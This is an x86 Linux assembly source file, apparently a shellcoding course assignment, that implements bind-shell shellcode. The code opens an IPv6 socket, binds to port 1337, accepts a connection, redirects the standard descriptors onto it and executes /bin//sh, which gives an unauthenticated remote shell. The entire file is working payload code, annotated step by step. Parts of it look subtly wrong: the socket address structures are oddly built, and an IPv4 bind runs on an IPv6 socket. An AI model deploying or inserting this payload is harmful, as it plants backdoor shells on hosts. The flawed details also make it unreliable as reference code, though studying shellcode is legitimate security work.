; Author: Kevin Kirsche
; Student ID: SLAE-1134

global _start

section .data
  NO: db 0x0

section .text

_start:
  ; zero out eax
  xor eax, eax
  ; https://syscalls.kernelgrok.com
  ; sys_socketcall
  ; eax   ebx       ecx
  ; 0x66  int call  unsigned long __user *args
  ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep -i socketcall
  ; #define __NR_socketcall 102
  ; 102 decimal == 0x66 hex
  mov al, 0x66


  ; zero out ebx
  xor ebx, ebx
  ; cat /usr/include/linux/net.h | grep -i socket
  ; #define SYS_SOCKET 1
  ; save a byte via inc rather than mov
  inc ebx

  ; we'll push the args in reverse order
  xor ecx, ecx  ; zero out ecx
  push ecx      ; push 0 for IP_PROTO
  push 0x1      ; #define SOCK_STREAM 1 == 0x1 hex
  ; http://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html
  push 0xa ; #define AF_INET6 10 == 0xa hex 

  ; put a pointer to our function args into ecx
  mov ecx, esp

  ; call socketcall
  int 0x80
  
  ; store our sockfd for use later
  xchg esi, eax  
 
  ; zero ecx
  xor ecx, ecx
  ; change NO to a 0
  ; mov [NO], 0x0 
  ; setup for IPv6 support
  push 0x4 ; push the int size
  push NO ; push a pointer to NO on the stack 
  ; #define IPV6_V6ONLY = 26
  push 0x1a ; 26 decimal == 0x1a hex
  ; #define IPPROTO_IPV6 41
  push 0x29 ; 41 decimal == 0x29 hex
  push esi ; push the sockfd on the stack


  xor eax, eax ; zero out eax
  mov al, 0x66 ; #define __NR_socketcall 102 

  xor ebx, ebx ; zero out ebx
  mov bl, 0xe  ; #define SYS_SETSOCKOPT 14

  xor ecx, ecx
  mov ecx, esp ; stack has our arguments
  int 0x80

bindv4:
  ; setup the v4 bind arguments
  xor ecx, ecx
  push ecx    ; INADDR_ANY
  push 0x3905 ; port 1337  
  push 0x2    ; #define AF_INET 2
  mov ecx, esp

  push 0x10      ; sizeof(v4lhost)
  push ecx       ; pointer to v4lhost
  push esi       ; sockfd
  mov ecx, esp   ; make sure our arguments are in ecx
  xor ebx, ebx   ; zero out ebx
  mov bl, 0x2    ; #define SYS_BIND 2
  xor eax, eax   ; zero out eax
  mov eax, 0x66  ; socketcall
  int 0x80

bindv6:
  ; setup the v6 bind arguments  
  xor ecx, ecx
  push ecx       ; in6addr_any
  push 0x3905    ; port 1337
  push 0xa       ; #define AF_INET6 10
  mov ecx, esp

  push 0x10     ; sizeof(v6lhost)
  push ecx      ; pointer to sizeof(v6lhost)
  push esi      ; sockfd
  mov ecx, esp  ; make sure our arguments are in ecx
  xor ebx, ebx  ; zero out ebx
  mov bl, 0x2   ; #define SYS_BIND 2
  xor eax, eax  ; zero out eax
  mov eax, 0x66 ; socketcall
  int 0x80      ; call socketcall

listen:
  ; perform listen command
  xor ecx, ecx  ; zero out ecx
  push ecx      ; queue size of 0
  push esi      ; push sockfd onto stack
  mov ecx, esp  ; put pointer to arguments in ecx
  xor ebx, ebx  ; zero out ebx
  mov bl, 0x4   ; #define SYS_LISTEN 4
  int 0x80

accept:
  ;perform accept command
  xor edx, edx  ; zero out EDX
  push edx      ; NULL
  push edx      ; NULL
  push esi      ; sockfd
  mov ecx, esp  ; store args in ecx
  inc ebx       ; #define SYS_ACCEPT 5
  xor eax, eax  ; zero out EAX
  mov al, 0x66  ; socketcall
  int 0x80

  xchg ebx, eax ; store our recvConn descriptor in EBX
  xor ecx, ecx

dup:
  mov al, 0x3f
  int 0x80
  inc ecx
  cmp cl, 0x4
  jne dup

execve:
  xor edx, edx
  push edx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  mov ecx, edx
  mov al, 0xb
  int 0x80
